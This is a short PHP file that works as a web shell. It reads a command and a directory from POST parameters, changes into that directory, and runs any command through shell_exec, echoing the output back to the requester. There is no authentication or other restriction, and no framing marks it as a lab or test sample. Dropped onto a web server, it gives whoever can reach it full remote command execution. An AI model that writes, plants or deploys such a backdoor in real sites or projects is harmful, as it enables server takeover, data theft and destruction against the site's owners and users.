<?php
if (isset($_POST['cmd'])) {
    $command = $_POST['cmd'];
    chdir($_POST['dir']);
    if(preg_match('/cd (.+)/',$command,$matches)){
        chdir($matches[1]);
        $output = "Changed Directory: ".getcwd();
    }else
        $output = shell_exec(escapeshellcmd($command));
    echo $output;
}